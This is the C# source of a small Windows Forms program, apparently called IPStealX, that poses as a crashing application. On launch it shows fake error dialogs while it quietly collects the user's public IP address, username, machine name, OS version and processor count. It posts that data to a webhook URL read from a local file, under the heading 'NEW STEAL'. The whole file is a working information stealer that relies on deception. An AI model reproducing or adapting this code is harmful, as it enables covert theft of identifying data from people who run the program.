using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;


namespace ApplicationFiles
{
  
    public partial class Form1 : Form
    {
        
        public Form1()
        {
            InitializeComponent();
            CSCord.webhooks cscord = new CSCord.webhooks();
            var filePath = Environment.CurrentDirectory + @"\wr.txt";
            MessageBox.Show("There was an unrecovarable error!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            //get ip address
            WebRequest request = WebRequest.Create("https://api64.ipify.org/");
            WebResponse response = request.GetResponse();
            Stream dataStream = response.GetResponseStream();
            StreamReader reader = new StreamReader(dataStream);
            var responseFromServer = reader.ReadToEnd();
            //send the ip address and pc username
            cscord.embed(File.ReadAllText(filePath), "", "IPStealX", "NEW STEAL", "**IP ADDRESS:** " + responseFromServer + ", **PC Username:** " + Environment.UserName  + ", **OS Information:** " + Environment.MachineName + " " + Environment.OSVersion + " Is 64 Bit: " + Environment.Is64BitOperatingSystem + " Processors: " + Environment.ProcessorCount , "Recieved using ApplicationFiles.exe", 0);
           
            MessageBox.Show("Please contact the developer for more information.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            this.Close();
        }

        private void Form1_Load(object sender, EventArgs e)
        {

        }
    }
}
